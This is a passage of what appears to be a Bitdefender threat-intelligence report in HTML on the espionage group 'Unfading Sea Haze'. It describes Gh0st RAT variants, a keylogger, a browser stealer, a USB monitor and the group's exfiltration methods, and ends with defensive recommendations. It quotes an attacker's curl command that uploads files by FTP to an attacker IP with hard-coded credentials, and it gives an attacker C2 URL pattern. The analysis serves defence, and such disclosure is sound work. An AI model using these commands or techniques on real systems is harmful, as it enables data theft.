back to the same location.\u003C\u002Fp\u003E\n\u003Cp\u003EThese cloud-based communication methods present a potential challenge for detection as they avoid traditional web shell communication channels.\u003C\u002Fp\u003E\n\u003Ch3\u003EGh0st Army\u003C\u002Fh3\u003E\n\u003Cp style=\"font-size: 16px; text-align: left;\"\u003EOur investigation uncovered three primary strains within the Gh0st RAT family, each showcasing a distinct development path.\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: center;\"\u003E\u003Cimg src=\"https:\u002F\u002Fbusinessresources.bitdefender.com\u002Fhubfs\u002Fimage-png-May-20-2024-04-44-47-6255-PM.png\" loading=\"lazy\" width=\"936\" height=\"194\"\u003E\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 12px; text-align: center;\"\u003E\u003Cem\u003EThe evolution and different variations of the Gh0st RAT used by Unfading Sea Haze.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cstrong\u003EMonolithic Versions (SilentGh0st and InsidiousGh0st):\u003C\u002Fstrong\u003E\n\u003Cul\u003E\n\u003Cli\u003EThe initial versions came packed with features, including numerous commands and modules. This very complexity and heavy footprint made them easier targets for security solutions.\u003C\u002Fli\u003E\n\u003Cli\u003ESilentGh0st, the oldest variant, later evolved into InsidiousGh0st. This evolution involved streamlining functionality, particularly where redundancy existed across modules.\u003C\u002Fli\u003E\n\u003Cli\u003EInterestingly, the language used for development shifted over time. InsidiousGh0st was initially written in C++, then upgraded to C# for features like SOCKS5 and TCP proxy support, and PowerShell improvements. Finally, a Go version emerged, introducing QUIC protocol support (prior versions relied solely on TLS over TCP and unencrypted TCP).\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EModular Versions (TranslucentGh0st, EtherealGh0st, and FluffyGh0st):\u003C\u002Fstrong\u003E\n\u003Cul\u003E\n\u003Cli\u003EThese more recent strains embrace a much more modular approach, emphasizing dynamic plugins and a lighter overall footprint.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp style=\"font-size: 16px; text-align: left;\"\u003EAs we analyzed artifacts from various time periods, another trend emerged: a preference for dynamic behavior by the attackers. Usernames and passwords transitioned from static values to a more dynamic approach, utilizing random generation. The malware also diversified its C2 infrastructure, employing multiple servers instead of relying on a limited few.\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: center;\"\u003E\u003Cimg src=\"https:\u002F\u002Fbusinessresources.bitdefender.com\u002Fhubfs\u002Fimage-png-May-20-2024-04-45-43-3931-PM.png\" loading=\"lazy\" width=\"936\" height=\"218\"\u003E\u003C\u002Fp\u003E\n\u003Cp style=\"text-align: center; font-size: 12px;\"\u003E\u003Cem\u003EAn approximate timeline of Gh0st variations deployment.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThere have been additional tools like \u003Cstrong\u003ESerialPktdoor\u003C\u002Fstrong\u003E, \u003Cstrong\u003EStubbedoor\u003C\u002Fstrong\u003E, and \u003Cstrong\u003ESharpZulip.\u003C\u002Fstrong\u003E These are described only in \u003Ca href=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Ffiles\u002F2024\u002F05\u002FBitdefender-Report-DeepDive-creat7721-en_EN.pdf\" rel=\"noopener\" target=\"_blank\"\u003Ethe full research whitepaper\u003C\u002Fa\u003E.\u003C\u002Fp\u003E\n\u003Ch2\u003EData Collection\u003C\u002Fh2\u003E\n\u003Cp\u003EOur analysis of collected artifacts strongly suggests the primary objective of these attacks is espionage. The attackers employed a combination of custom and off-the-shelf tools to gather sensitive data from victim machines.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003Exkeylog Keylogger\u003C\u002Fstrong\u003E: This custom-made keylogger, named for its frequent export filename, captures keystrokes on compromised systems. We encountered it in various forms, including DLL files and shellcode payloads. The attackers strategically placed xkeylog DLLs in common locations like \u003Cspan style=\"background-color: lightgrey;\"\u003Ec:\\windows\\setup\\cert.dll\u003C\u002Fspan\u003E and \u003Cspan style=\"background-color: lightgrey;\"\u003Ec:\\windows\\cursors\\curs.cur\u003C\u002Fspan\u003E. These DLLs were likely loaded using the legitimate tool \"regsvr32.exe\". Shellcodes containing xkeylog were executed through various means, including the \u003Cspan style=\"background-color: lightgrey;\"\u003Eperceptionsimulation\u003C\u002Fspan\u003E service described in the previous section.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EBrowser Data Stealer\u003C\u002Fstrong\u003E: This custom tool collects browsing data from compromised machines. The loader used to execute the browser stealer is also interesting, as we've observed this same loader used to deploy at least one other tool – a network scanner that remains active in the attacker's current operations. Once loaded in memory and executed, the browser stealer can be customized using command-line arguments. These arguments control the specific actions it takes: the stealer parses internal browser database files to extract valuable information, such as cookies. Our analysis revealed it supports a range of browsers:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EGoogle Chrome\u003C\u002Fli\u003E\n\u003Cli\u003EFirefox\u003C\u002Fli\u003E\n\u003Cli\u003EMicrosoft Edge\u003C\u002Fli\u003E\n\u003Cli\u003EInternet Explorer\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp style=\"font-size: 16px; text-align: left;\"\u003EIn March 2024, we observed a new tool added to the attacker's arsenal: a PowerShell script embedded within Ps2dllLoader samples. This script targets Chrome browser data, parsing internal files to extract sensitive information. It appears the attackers haven't limited themselves to Chrome, as a similar script targeting the Edge browser has also been identified.\u003C\u002Fp\u003E\n\u003Cp style=\"font-size: 16px; text-align: center;\"\u003E\u003Cimg src=\"https:\u002F\u002Fbusinessresources.bitdefender.com\u002Fhubfs\u002Fimage-png-May-20-2024-04-47-06-0150-PM.png\" loading=\"lazy\" width=\"936\" height=\"246\"\u003E\u003C\u002Fp\u003E\n\u003Cp style=\"text-align: center; font-size: 12px;\"\u003E\u003Cem\u003EScript for extracting encrypted data from Google Chrome\u003C\u002Fem\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EUSB and Windows Portable Devices (WPD) Monitor\u003C\u002Fstrong\u003E: This custom tool monitors presence of portable devices. The monitoring tool was found at C:\\Users\\&lt;User&gt;\\AppData\\Roaming\\mscorsvc.dll and is loaded via DLL sideloading. Once loaded, the tool checks for portable devices every 10 seconds. If a WPD or USB is mounted, it gathers details about the device, and sends them using HTTP GET request to an attacker-controlled server at \u003Cspan style=\"background-color: lightgrey;\"\u003Ehttp:\u002F\u002F139.180.216[.]33\u002Fico\u002Ferror\u002F?&lt;computer name&gt;%20&lt;device manufacturer&gt;%20&lt;device model&gt;%20&lt;device friendly name&gt;\u003C\u002Fspan\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EWhile these custom tools provided significant data collection capabilities, the attackers also employed manual techniques. We observed instances where they used the common compression tool \u003Cspan style=\"background-color: lightgrey;\"\u003Erar.exe\u003C\u002Fspan\u003E to archive data, specifying files of interest through command-line parameters. They specified file extensions (e.g., .docx, .pdf) and targeted only files modified after a specific date, ensuring they captured the latest data. Similar extraction commands were used to collect files from remote systems using \u003Cspan style=\"background-color: lightgrey;\"\u003Enet use\u003C\u002Fspan\u003E. The resulting archive was password-protected, ready for extraction.\u003C\u002Fp\u003E\n\u003Cp\u003EThe attackers also specifically targeted data from messaging applications like Telegram and Viber. To ensure they could access these app's files, they first terminated the running processes (\u003Cspan style=\"background-color: lightgrey;\"\u003Etelegram.exe\u003C\u002Fspan\u003E and \u003Cspan style=\"background-color: lightgrey;\"\u003Eviber.exe\u003C\u002Fspan\u003E) before using \u003Cspan style=\"background-color: lightgrey;\"\u003Erar.exe\u003C\u002Fspan\u003E to archive the application data.\u003C\u002Fp\u003E\n\u003Cp\u003EThis blend of custom and off-the-shelf tools, along with manual data extraction, paints a picture of a targeted espionage campaign focused on acquiring sensitive information from compromised systems.\u003C\u002Fp\u003E\n\u003Ch2\u003EData Exfiltration\u003C\u002Fh2\u003E\n\u003Cp\u003EAfter an extensive analysis of the artefacts collected during the investigation, we concluded that the exfiltration process between March1st, 2018 until January 20\u003Csup\u003Eth\u003C\u002Fsup\u003E, 2022, was performed using a custom tool we’ve named \u003Cstrong\u003EDustyExfilTool\u003C\u002Fstrong\u003E. This command line tool simplifies data exfiltration: it takes a file path, server IP address, and port as input, and transmits the file to the specified server using TLS over TCP for secure communication.\u003C\u002Fp\u003E\n\u003Cp\u003EStarting in January 2022, the attackers switched their exfiltration strategy. They abandoned DustyExfilTool in favor of the curl utility and FTP protocol. The initial curl command for exfiltration utilized hardcoded credentials \u003Cspan style=\"background-color: lightgrey;\"\u003Eadmin:EH3FqtECXv152\u003C\u002Fspan\u003E as seen in the following example:\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cspan style=\"background-color: lightgrey;\"\u003Ecurl -C - ftp:\u002F\u002F139.180.221[.]55:80\u002F -u admin:EH3FqtECXv152 -T c:\\\\windows\\\\addins\\\\fs.tmp\\\u003C\u002Fspan\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EHowever, since 2023, a more dynamic approach has been observed. The username and password for the FTP server are now changed more frequently, and both credentials appear to be randomly generated. This shift suggests the attackers are attempting to improve their operational security by employing less predictable credentials.\u003C\u002Fp\u003E\n\u003Ch1\u003EConclusion and recommendations\u003C\u002Fh1\u003E\n\u003Cp\u003EThe Unfading Sea Haze threat actor group has demonstrated a sophisticated approach to cyberattacks. Their custom malware arsenal, including the Gh0st RAT family and Ps2dllLoader, showcases a focus on flexibility and evasion techniques. The observed shift towards modularity, dynamic elements, and in-memory execution highlights their efforts to bypass traditional security measures. Attackers are constantly adapting their tactics, necessitating a layered security approach.\u003C\u002Fp\u003E\n\u003Cp\u003EHere are some recommendations to mitigate the risks posed by the Unfading Sea Haze threat actor and similar groups:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cstrong\u003EVulnerability Management\u003C\u002Fstrong\u003E: Start with \u003Ca href=\"https:\u002F\u002Ftechzone.bitdefender.com\u002Fen\u002Fsecurity-layers\u002Fprevention.html\" rel=\"noopener\" target=\"_blank\"\u003Eprevention\u003C\u002Fa\u003E - companies must prioritize patch management to swiftly identify and address critical vulnerabilities. Implementing robust processes for patch deployment can significantly reduce the attack surface and mitigate the risk of exploitation. Prioritize addressing vulnerabilities with high CVSS scores, particularly for servers exposed to the internet that can lead to remote code execution.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EStrong Authentication\u003C\u002Fstrong\u003E: Start with enforcing strong password policies that require complex characters and regular changes. Avoid password reuse across accounts. For an extra layer of protection, enable Multi-Factor Authentication (MFA) whenever possible. MFA significantly reduces the risk of unauthorized access even if your password is compromised. To future-proof your security posture, consider exploring passwordless authentication options compliant with the FIDO2 standard.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EProper Network Segmentation\u003C\u002Fstrong\u003E: Implementing proper network segmentation and adopting a zero trust networking model are crucial steps in enhancing security posture. By segmenting the network into smaller, more manageable zones and enforcing strict access controls based on the principle of least privilege, organizations can limit the lateral movement of threat actors and minimize the potential impact of a breach.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EMultilayered Defense\u003C\u002Fstrong\u003E: Adopting a \u003Ca href=\"https:\u002F\u002Ftechzone.bitdefender.com\u002Fen\u002Fgravityzone-platform\u002Fmulti-layered-security.html\" rel=\"noopener\" target=\"_blank\"\u003Emultilayered security approach\u003C\u002Fa\u003E is essential. Organizations should invest in a diverse range of security controls, including network segmentation and endpoint protection to create overlapping layers of defense against cyber threats.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003ENetwork Traffic Monitoring\u003C\u002Fstrong\u003E: Maintain network traffic monitoring to identify unusual communication patterns that might indicate remote code execution or cloud storage interactions employed by malware. Additionally, web filtering solutions can help block access to malicious websites that might be used for malware distribution.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EEffective Logging\u003C\u002Fstrong\u003E: Ensure logging is enabled, functional, and provides sufficient information and historical data for effective support when needed. Robust logging mechanisms can aid in post-incident analysis, forensic investigations, and monitoring for suspicious activities. Regularly review and update logging configurations to capture relevant security events and maintain visibility across the environment.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EDetection and Response\u003C\u002Fstrong\u003E: Despite your best efforts, it is still possible that modern threat actors will make it past your prevention and protection controls. This is where your \u003Ca href=\"https:\u002F\u002Ftechzone.bitdefender.com\u002Fen\u002Fsecurity-layers\u002Fdetection.html\" rel=\"noopener\" target=\"_blank\"\u003Edetection\u003C\u002Fa\u003E and response capabilities come into play. Whether you get these capabilities as-a-product (\u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fbusiness\u002Fenterprise-products\u002Fendpoint-detection-response.html\" rel=\"noopener\" target=\"_blank\"\u003EEDR\u003C\u002Fa\u003E\u002F\u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fbusiness\u002Fproducts\u002Fgravityzone-xdr.html\" rel=\"noopener\" target=\"_blank\"\u003EXDR\u003C\u002Fa\u003E) or as-a-service (\u003Ca href=\"https:\u002F\u002Ftechzone.bitdefender.com\u002Fen\u002Fsecurity-layers\u002Fresponse\u002Fmanaged-detection-and-response.html\" rel=\"noopener\" target=\"_blank\"\u003EMDR\u003C\u002Fa\u003E), the purpose is to minimize the time when threat actors remain undetected. Bitdefender MDR team conducts a proactive search through an environment to hunt malicious, suspicious, or risky activities that have evaded detection by existing tools.​\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003ECollaboration and Information Sharing\u003C\u002Fstrong\u003E: Foster collaboration within the cybersecurity community to share threat intelligence and best practices. By participating in information-sharing initiatives and collaborating with industry peers, organizations can gain valuable insights into emerging threats and enhance their cyber resilience.\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003EAdvanced Threat Intelligence\u003C\u002Fstrong\u003E: The right threat intelligence solutions can provide critical insights about attacks. \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fbusiness\u002Fproducts\u002Fadvanced-threat-intelligence.html\" rel=\"noopener\" target=\"_blank\"\u003EBitdefender IntelliZone\u003C\u002Fa\u003E is an easy-to-use solution that consolidates all the knowledge we've gathered regarding cyber threats and the associated threat actors into a single pane of glass for the security analysts, including access to Bitdefender’s next-generation malware analysis service. If you already have an IntelliZone account you can find additional structured information under Threat ID \u003Ca href=\"https:\u002F\u002Fintellizone.bitdefender.com\u002Fen\u002Fthreat-search\u002Fthreats\u002FBDx8y3ujm3\" rel=\"noopener\" target=\"_blank\"\u003EBDx8y3ujm3X\u003C\u002Fa\u003E.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EThis summary provides a high-level overview of the Unfading Sea Haze threat actor's tactics and the evolving nature of their malware arsenal.
